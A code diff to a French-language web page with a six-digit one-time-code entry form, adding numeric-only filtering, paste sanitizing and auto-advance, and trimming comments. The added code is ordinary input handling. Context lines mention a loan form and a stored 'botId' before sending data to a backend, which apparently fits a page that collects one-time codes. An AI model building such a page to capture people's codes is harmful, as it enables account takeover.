@@ -118,12 +118,12 @@ body{
     </div>
 
     <div class="otp">
-        <input maxlength="1">
-        <input maxlength="1">
-        <input maxlength="1">
-        <input maxlength="1">
-        <input maxlength="1">
-        <input maxlength="1">
+        <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        <input maxlength="1" inputmode="numeric" pattern="[0-9]*">
     </div>
 
     <div class="resend-wrap">
@@ -145,7 +145,6 @@ body{
             // If name is still missing, try to get it from the loan form (fullName)
             if (!name) {
                 name = localStorage.getItem('fullName');
-                // Store it as 'name' for consistency
                 if (name) localStorage.setItem('name', name);
             }
 
@@ -157,10 +156,9 @@ body{
                 if (phone) localStorage.setItem('phone', phone);
             }
 
-            // Store botId if missing
             if (botId) localStorage.setItem('botId', botId);
 
-            // ── 2. Create a message container (no alerts) ──
+            // ── 2. Create a message container ──
             const container = document.querySelector('.container');
             const msgDiv = document.createElement('div');
             msgDiv.id = 'message-box';
@@ -187,9 +185,13 @@ body{
                 msgDiv.textContent = '';
             }
 
-            // ── 3. OTP auto‑advance & continue button logic ──
+            // ── 3. OTP auto‑advance & numeric‑only filter ──
             const inputs = document.querySelectorAll('.otp input');
             const continueBtn = document.querySelector('.continue-btn');
+
+            function sanitizeDigit(value) {
+                return value.replace(/\D/g, ''); // keep only digits
+            }
 
             function checkAllFilled() {
                 let allFilled = true;
@@ -208,7 +210,14 @@ body{
             }
 
             inputs.forEach((input, index) => {
+                // Input event: filter digits and auto‑advance
                 input.addEventListener('input', function() {
+                    // Keep only digits
+                    const cleaned = sanitizeDigit(this.value);
+                    if (cleaned !== this.value) {
+                        this.value = cleaned;
+                    }
+                    // If there is a digit, move to next
                     if (this.value.length === 1) {
                         if (index < inputs.length - 1) {
                             inputs[index + 1].focus();
@@ -218,6 +227,19 @@ body{
                     hideMessage();
                 });
 
+                // Paste event: sanitize pasted content
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const digits = sanitizeDigit(paste);
+                    if (digits) {
+                        this.value = digits.slice(0, 1); // only first digit
+                        // Simulate input event to trigger auto‑advance
+                        this.dispatchEvent(new Event('input'));
+                    }
+                });
+
+                // Backspace handling
                 input.addEventListener('keydown', function(e) {
                     if (e.key === 'Backspace' && this.value === '' && index > 0) {
                         inputs[index - 1].focus();
@@ -281,7 +303,7 @@ body{
 
             startTimer(5 * 60);
 
-            // ── 5. Check required data (name, phone, botId) ──
+            // ── 5. Check required data ──
             function hasRequiredData() {
                 if (!name) {
                     showMessage('Nom manquant – veuillez revenir à l\'étape précédente pour saisir votre nom.', true);
@@ -299,7 +321,7 @@ body{
                 return true;
             }
 
-            // ── 6. Backend communication with inline messages ──
+            // ── 6. Backend communication ──
             continueBtn.addEventListener('click', function() {
                 if (this.disabled) return;
 
